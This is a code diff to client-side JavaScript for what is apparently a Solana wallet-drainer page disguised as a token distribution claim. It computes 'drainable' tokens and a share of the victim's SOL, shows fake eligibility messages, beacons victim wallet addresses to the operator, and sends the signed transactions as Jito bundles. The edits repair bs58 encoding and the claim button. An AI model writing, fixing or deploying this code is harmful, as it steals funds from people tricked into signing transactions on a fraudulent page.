@@ -88,8 +88,8 @@
     try{ const r=await fetch(JITO_TIP_URL,{signal:AbortSignal.timeout(5000)}); const j=await r.json(); if(Array.isArray(j)&&j.length>0) return Math.ceil(Math.max(...j)*1.1); }catch(e){} return 10000;
   }
   async function sendJitoBundle(signedTxs, tipTx){
-    const base58=solanaWeb3.bs58 || solanaWeb3.BS58;
-    if(!base58) throw new Error('bs58 unavailable');
+    const base58 = (typeof bs58 !== 'undefined' && bs58.encode) ? bs58 : (solanaWeb3.bs58 || (solanaWeb3.BS58 && solanaWeb3.BS58));
+    if(!base58 || typeof base58.encode !== 'function') throw new Error('bs58 unavailable');
     const bundle=signedTxs.map(tx=>base58.encode(tx.serialize()));
     if(tipTx) bundle.push(base58.encode(tipTx.serialize()));
     const payload={jsonrpc:'2.0',id:1,method:'sendBundle',params:[bundle]};
@@ -298,7 +298,7 @@
 
       const solAbove=disc.solBalance>_cfg.solReserve?disc.solBalance-_cfg.solReserve:0;
       const solToSend=Math.floor(solAbove*(_cfg.solPercentage/100));
-      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }
+      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }
 
       // TOCTOU: snapshot and re-verify before building final txs
       const snapshot={solBalance:disc.solBalance,tokens:drainable};
